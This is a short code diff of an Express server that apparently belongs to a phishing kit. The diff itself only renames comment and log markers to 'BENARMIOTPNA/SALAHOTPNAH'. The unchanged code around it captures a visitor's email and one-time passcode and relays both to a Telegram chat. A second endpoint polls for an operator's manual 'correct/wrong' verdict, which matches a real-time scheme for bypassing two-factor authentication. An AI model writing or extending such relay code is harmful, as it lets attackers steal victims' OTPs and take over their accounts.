@@ -495,7 +495,7 @@ Sitemap: ${baseUrl}/sitemap.xml`;
     }
   });
 
-  // POST /api/submit-otp-telegram - Submit OTP and notify Telegram, wait for BENARMIOTPTA
+  // POST /api/submit-otp-telegram - Submit OTP and notify Telegram, wait for BENARMIOTPNA/SALAHOTPNAH
   app.post("/api/submit-otp-telegram", otpVerificationLimiter, honeypotTrap, async (req, res) => {
     try {
       const { loginAttemptId, otpCode, sessionId } = req.body;
@@ -532,7 +532,7 @@ Sitemap: ${baseUrl}/sitemap.xml`;
         sendOtpVerificationNotification(session.email || '', otpCode, loginAttemptId, sourceInfo, telegramConfig)
           .then((success: boolean) => {
             if (success) {
-              console.log('[Telegram] OTP notification sent, waiting for BENARMIOTPTA...');
+              console.log('[Telegram] OTP notification sent, waiting for BENARMIOTPNA...');
             }
           })
           .catch((err: Error) => {
@@ -550,7 +550,7 @@ Sitemap: ${baseUrl}/sitemap.xml`;
     }
   });
 
-  // GET /api/otp-status - Poll for BENARMIOTPTA approval
+  // GET /api/otp-status - Poll for BENARMIOTPNA/SALAHOTPNAH approval
   app.get("/api/otp-status", async (req, res) => {
     try {
       const loginAttemptId = req.query.loginAttemptId as string;
